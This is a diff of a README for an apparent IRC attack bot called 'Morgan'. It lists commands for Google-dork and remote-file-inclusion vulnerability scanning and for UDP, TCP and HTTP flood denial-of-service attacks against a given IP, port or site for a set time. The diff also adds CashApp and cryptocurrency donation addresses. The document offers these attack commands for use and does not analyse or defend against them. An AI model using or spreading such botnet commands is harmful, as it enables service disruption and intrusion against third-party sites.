@@ -14,14 +14,16 @@ New l33t colors
 Fixed Google
 
 ## Scan command:
-!morgan !eval @gstring='google%20dork';
+!morgan
+
+!eval @gstring='google%20dork';
 
 !morgan @rfiscan vulnfile.php?vulnvar=
 
 ## DDoS commands:
-Udp : !morgan @udpflood IP packet-size time
+Udp: !morgan @udpflood IP packet-size time
 
-Tcp : !morgan @tcpflood IP port time
+Tcp: !morgan @tcpflood IP port time
 
 Http: !morgan @httpflood www.demo.com time
 
@@ -32,3 +34,10 @@ Hackwood
 
 Enjoy the bot ....
 /Morgan
+
+## Donate
+CashApp: $yahooadmin 
+
+Ethereum: 0xBf35D0994Aa944C22BDba2Fd019dd1fac55DEf5c
+
+RavenCoin: RBTmX8cFrhBZ4RDLjZSqDwA79krQJAupCY
